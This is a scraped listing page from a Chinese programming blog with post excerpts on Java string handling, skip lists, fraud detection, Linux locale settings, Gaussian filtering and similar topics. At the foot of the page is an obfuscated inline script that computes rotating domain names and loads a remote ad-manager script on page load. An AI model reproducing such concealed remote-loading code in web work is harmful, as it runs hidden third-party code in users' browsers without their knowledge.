令 P1 指向字符串原来的末尾位置，P2 指向字符串现在的末尾位置。P1 和 P2 从后向前遍历，当 P1 遍历到一个空格时，就需要令 P2 指向的位置依次填充 02%（注意是逆序的），否则就填充上 P1 指向字符的值。
从后向前遍是为了在改变 P2 所指向的内容时，不会影响到 P1 遍历原来字符串的内容。
三、解决问题 3.1 代码实现 调用自带函数 /** * 调用自带函数 * @param str * @return */ public String replaceSpace1(StringBuffer str) { if(null == str || str.length() == 0){ System.out.println("字符串输入无效！"); return null; } //replace(char oldChar, char newChar) //返回一个新的字符串，它是通过用 newChar 替换此字符串中出现的所有 oldChar 得到的。 return str.toString().replace(" ", "%20"); } 用新的数组存 public String replaceSpace(StringBuffer str){ if(null == str || str.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3620f5dc9bc2f16702ec00a7b9a8f392/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3a83b3c7e814fc73a84df0e589b8faa/" rel="bookmark">
			unreal4烘焙灯光出现黑面的情况如何解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象 ：局部黑面或者漏光： 解决方法1：模型属性general settings&gt;【light map resolution】 相应提高 世界设置&gt;lightmass&gt;【Static lighting level 】 值越低精度越高。烘焙级别为【产品级】
解决方法2：重新展开lightmap UV 更加合理一些。UV整体与象限边界之间留出空隙。
直接现象：烘焙后整个黑面 附加现象1：导致的第一个问题，三维中法线是向内的，但是到了unreal 中法线表现就反了，而且镜像复制的模型即使反转法线也无法正常渲染
附加现象2：导致烘焙结果相反且出现整个黑面。且mesh预览缩略图为暗色。
附加现象3：导致max模型坐标是相反的，反向坐标导出就会 造成错误。
推论：因为镜像复制导致空间坐标出错，纠正即可。镜像复制的模型甚至会造成贴图导出到SP表现错误，所以模型完成后要记得修正镜像模型的坐标空间。
解决方法：
1. 不处理镜像模型，只导出原模型（如果有原模型）。
2.【重置变换】+【反转法线】纠正物体的 变换属性然后再导出到unreal中，此时便没有上述的任何问题，烘焙结果正确。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d2c6189eb7630e070cad8cce976ae8e/" rel="bookmark">
			跳跃表代码完整实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		跳跃表实现
#include &lt;iostream&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include &lt;memory&gt; using namespace std; const int MaxLevel = 10; int RandomLevel() { int k = 1; while (rand() % 2) { k++; } k = (k &lt;= MaxLevel) ? k : MaxLevel; return k; } class SkipNode { public: SkipNode() { key = 0; value = 0; for (int i = 0; i &lt; MaxLevel; ++i) { forward[i] = nullptr; } } virtual ~SkipNode() { cout &lt;&lt; value &lt;&lt; endl; } int key; int value; shared_ptr&lt;SkipNode&gt; forward[MaxLevel]; }; class SkipList { public: SkipList() { level = 0; } virtual ~SkipList() { cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d2c6189eb7630e070cad8cce976ae8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2650424d711dbbbff9dcdbc06845e117/" rel="bookmark">
			信用卡欺诈检测模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据来源与背景 数据来源:https://www.kaggle.com/mlg-ulb/creditcardfraud
数据背景:
拿到的数据是持卡人两天内的信用卡交易数据,要解决的问题是预测持卡人是否会发生信用卡被盗刷.其结果只有两种可能,被盗刷或者不被盗刷,这份数据是有目标列的,也就是说这是一个监督学习的场景,并且是一个二元分类问题,所以本项目可以选用逻辑斯蒂回归（Logistic Regression)。数据为结构化数据,不需要做特征抽象.特征V1和V28是经过PCA处理的,而特征Time和Amount的数据规格与其他特征差别较大，需要对其做特征缩放，将特征缩放至同一个规格。在数据质量方面，没有出现乱码或空字符的数据，可以确定字段Class为目标列，其他列为特征列。 1 数据获取与解析 import numpy as np import pandas as pd from pandas import Series,DataFrame import matplotlib.pyplot as plt %matplotlib inline credit = pd.read_csv('./creditcard.csv') credit.head() credit.shape (284807, 31) credit.info() &lt;class 'pandas.core.frame.DataFrame'&gt; RangeIndex: 284807 entries, 0 to 284806 Data columns (total 31 columns): Time 284807 non-null float64 V1 284807 non-null float64 V2 284807 non-null float64 V3 284807 non-null float64 V4 284807 non-null float64 V5 284807 non-null float64 V6 284807 non-null float64 V7 284807 non-null float64 V8 284807 non-null float64 V9 284807 non-null float64 V10 284807 non-null float64 V11 284807 non-null float64 V12 284807 non-null float64 V13 284807 non-null float64 V14 284807 non-null float64 V15 284807 non-null float64 V16 284807 non-null float64 V17 284807 non-null float64 V18 284807 non-null float64 V19 284807 non-null float64 V20 284807 non-null float64 V21 284807 non-null float64 V22 284807 non-null float64 V23 284807 non-null float64 V24 284807 non-null float64 V25 284807 non-null float64 V26 284807 non-null float64 V27 284807 non-null float64 V28 284807 non-null float64 Amount 284807 non-null float64 Class 284807 non-null int64 dtypes: float64(30), int64(1) memory usage: 67.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2650424d711dbbbff9dcdbc06845e117/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef31d17e4c8e4fa271b0caae99afe21f/" rel="bookmark">
			高等数学学习笔记——第九讲——数列收敛的判定方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 问题引入
2. 夹逼定理（夹在两个收敛到相同极限的数列间的数列也收敛于同一极限）
3. 夹逼定理的应用示例
4. 单调有界定理（单调增加（下降）且有上界（下界）的数列收敛于上确界（下确界））
注意：以下推论应该有误，应为：单调下降且有下界
5. 单调有界定理定理的应用——纳皮尔常数（欧拉常数）的精确表示
6. 区间套定理
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e16ce8b93a660547ad0ba8329efeb15c/" rel="bookmark">
			41-14linux语言环境设置locale
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		locale是根据计算机用户所使用的语言，所在国家或者地区，以及当地的文化传统所定义的一个软件运行时的语言环境
在Linux中通过locale来设置程序运行的不同语言环境，locale由 ANSI C提供支持。locale的命名规则为_.，如zh_CN.GBK，zh代表中文， CN代表大陆地区，GBK表示字符集
一、修改系统默认语言及中文乱码问题
记录系统默认使用语言的文件是/etc/sysconfig/i18n,如果默认安装的是中文的系统，i18n的内容如下：
LANG=“zh_CN.UTF-8”
SYSFONT=“latarcyrheb-sun16”
SUPPORTED=“zh_CN.UTF-8:zh_CN:zh”
LINUXTYPE=targeted
LANG变量是language的简称，决定系统的默认语言的，即系统的菜单、程序的工具栏语言、输入法默认语言等。SYSFONT是system font的简称，决定系统默认用哪一种字体。SUPPORTED变量决
定系统支持的语言，即系统能够显示的语言。需要说明的是，由于计算机起源于英语国家，因此，不管你把这些变量设置成什么，英语总是默认支持的，而且不管用什么字体，英文字体总包含在其中。
临时调整终端乱码现象：# LANG=“en_US.UTF-8” 即把系统的语言临时设置成英文，或者更简单一点，可以直接这样： # LANG="" 或export LANG=""
LANG变量被清空后，系统就默认用英语。这样设置后，在字符模式下输出的出错信息等就是全英文的了。但这种设置是临时的，只是临时改变了LANG这个bash变量而已。当退出重新登录或者切换到其他字符终端后就无效了。只要把i18n文件中的LANG变量设置成英文的”en_US.UTF-8”，就可以永久解决这个问题了。
命令：vi etc/sysconfig/i18n
修改后的文件如下：
#LANG=“zh_CN.UTF-8”
LANG=“en_US.UTF-8”
SYSFONT=“latarcyrheb-sun16”
SUPPORTED=“zh_CN.UTF-8:zh_CN:zh”
请不要把LANG变量简单的清空，因为这个变量不仅在字符模式下用到，在图形界面下也用到，简单清空在字符模式下确实不会有问题，但在图形界面下，却会造成中文无法正常显示的情况，在过去Redhat系列的版本中i18n文件中还有一个叫LANGUAGE的变量，专门控制图形界面下的语言设置，现在的FC系列中已经把这两个变量整合成一个变量了。
二、locale
程序运行使用一套语言需要有字符集（数据）和字体（显示），Locale是根据计算机用户所使用的语言，所在国家或者地区，以及当地的文化传统所定义的一个软件运行时的语言环境。
locale常用操作
1、查看现有语言环境：
locale
2、可用语言环境：
locale -a
3、临时修改语言环境：
AIX：
#export LANG=en_US
export LANG=zh_CN
Linux：
#export LANG=en_US.UTF-8
export LANG=zh_CN.UTF-8
4、永久修改系统级字符集：
修改/etc/sysconfig/i18n
英文版系统：
LANG=“en_US.UTF-8”
SYSFONT=“latarcyrheb-sun16”
中文版系统：
#LANG=“zh_CN.gbk”
LANG=“zh_CN.UTF-8”
SYSFONT=“latarcyrheb-sun16”
执行source /etc/sysconfig/i18n使修改生效；
再次执行locale命令可查看修改已生效：
或者加到配置文件中
vi /.bash_profile
export LANG=en_US.UTF-8
三、安装中文字符集
1、安装所有与中文支持相关的包
yum -y groupinstall chinese-support 2、修改字符编码配置文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e16ce8b93a660547ad0ba8329efeb15c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc1793c66c5f0b05e35970cceb7df293/" rel="bookmark">
			剑指Offer面试题：3.不修改数组找出重复的数字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、题目 在一个长度为n+1的数组里面的所有数字都在1~n的范围内，所以数组中至少有一个数字是重复的。请找出数组中任意一个重复的数字，但不能修改输入的数组。例如，如果输入长度为9的数组{2,3,5,4,3,2,6,7}，那么对应的输出是重复的数字2或者3。
二、思路 方法一
创建一个新n+1的数组data，遍历原来的数组如 2 将2存到 data[2]中， 3存到data[3]中…. 等下下次一遍历到3 发现data[3]=3 说明重复了。
算法时间复杂度为 O(n),空间复杂度O(n)
方法二
使用二分法。 如：{2,3,5,4,3,2,6,7} 先二分，先统计在1-4里面的数字个数如果大于4则说明1~4里面有重复数字，否则5-7里面有重复数字。重复上面操作。
分析：二分查找logn ，但是getCount每个数组遍历一变 n，时间复杂度为O(nlogn),空间复杂度为O(1)。但是这个方法有个问题不能找出所有的重复元素。
如{2,2,4,4,5,5} 找到的元素会是4。
start=1,end=5,middle=3. 1-3中元素有2个则4~5有重复
start=4,end=5,middle=4。 4有2个元素
start=4,end=4,middle=4, 返回4。
三、解决问题 3.1 代码实现 方法一
/** * 创建一个新n+1的数组data，遍历原来的数组如 2 将2存到 data[2]中， 3存到data[3]中…. 等下下次一遍历到3 发现data[3]=3 说明重复了。 * 算法时间复杂度为 O(n),空间复杂度O(n) * @param arr * @return */ public int getDuplicate1(int[] arr) { if(null == arr || arr.length &lt;= 0){ System.out.println("数组输入无效！"); return -1; } for(int num : arr){ if (num &lt; 1 || num &gt; arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc1793c66c5f0b05e35970cceb7df293/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45e3731a6a77033909e6c0ea8465730e/" rel="bookmark">
			【图像处理】高斯滤波
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		高斯滤波 高斯滤波属于线性平滑滤波的一种，可以消除高斯噪声，广泛应用于图像处理的减噪过程。大家常说高斯滤波是最有用的滤波操作，虽然它用起来效率往往不是最高的。
首先，我们先要了解高斯滤波的原理，以及高斯滤波消除的高斯噪声是什么？
噪声，是图像中表现极为突兀的像素点或者像素块，会给图像带来干扰，让图像变得不清楚，或者说影响观察图像的细节。
而高斯噪声，就是噪声像素的概率密度函数服从高斯分布（正态分布）
高斯噪声就是它的概率密度函数服从高斯分布（即正态分布）的一类噪声。如果一个噪声，它的幅度分布服从高斯分布，而它的功率谱密度又是均匀分布的，则称它为高斯白噪声。高斯白噪声的二阶矩不相关，一阶矩为常数，是指先后信号在时间上的相关性。
高斯函数：
注：σ的大小决定了高斯函数的宽度。
通俗地讲，高斯滤波就是对整幅图像进行加权平均的过程，每一个像素点的值，都由其本身核邻域内的其他像素值经过加权平均后得到。高斯滤波的具体操作是：用一个模板（或称卷积、掩膜）扫描图像中的每一个像素，用模板确定的邻域内像素的加权平均灰度值去替代模板中心像素点的值。
高斯核：
理论上，高斯分布在所有定义域上都有非负值，这就需要一个无限大的卷积核。实际上，仅需要取均值周围3倍标准差内的值，以外部份直接去掉即可。 如下图为一个标准差为1.0的整数值高斯核。
很明显的看出来，上图高斯核矩阵满足二维高斯分布。
理论上，高斯分布在所有定义域上都有非负值，这就需要一个无限大的卷积核。实际上，仅需要取均值周围3倍标准差内的值，以外部份直接去掉即可。
高斯滤波的重要两步就是先找到高斯模板然后再进行卷积，模板（mask在查阅中有的地方也称作掩膜或者是高斯核）。所以这个时候需要知道它怎么来？又怎么用？
举个栗子：
假定中心点的坐标是（0,0），那么取距离它最近的8个点坐标，为了计算，需要设定σ的值。假定σ=1.5，则模糊半径为1的高斯模板就算如下
这个时候我们我们还要确保这九个点加起来为1（这个是高斯模板的特性），这9个点的权重总和等于0.4787147，因此上面9个值还要分别除以0.4787147，得到最终的高斯模板。
高斯滤波计算
有了高斯模板，那么高斯滤波的计算便顺风顺水了。
举个栗子：
假设现有9个像素点，灰度值（0-255）的高斯滤波计算如下：
将这9个值加起来，就是中心点的高斯滤波的值。
对所有点重复这个过程，就得到了高斯模糊后的图像。
高斯滤波步骤
综上可以总结一下步骤：
（1）移动相关核的中心元素，使它位于输入图像待处理像素的正上方
（2）将输入图像的像素值作为权重，乘以相关核
（3）将上面各步得到的结果相加做为输出
简单来说就是根据高斯分布得到高斯模板然后做卷积相加的一个过程
部分转自：https://www.jianshu.com/p/73e6ccbd8f3f
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6f7de1bc6106a4560a41fe80246f668/" rel="bookmark">
			vector 删除元素的几种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//vector 删除元素方式 #include &lt;vector&gt; #include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; int main(int argc, char const *argv[]) { vector&lt;int&gt; vec; for (int i = 0; i &lt; 10; i++) { vec.emplace_back(i); } //第一种 删除5元素 // auto it = std::find(vec.begin(), vec.end(), 5); // vec.erase(it); // for_each(vec.begin(), vec.end(), [](int v){cout &lt;&lt; v &lt;&lt; endl;}); //第二种 删除5元素 // vec.erase(vec.begin()+5); // for_each(vec.begin(), vec.end(), [](int v) { cout &lt;&lt; v &lt;&lt; endl; }); //第三种 删除5元素 // for(auto it = vec.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6f7de1bc6106a4560a41fe80246f668/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/456/">«</a>
	<span class="pagination__item pagination__item--current">457/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/458/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>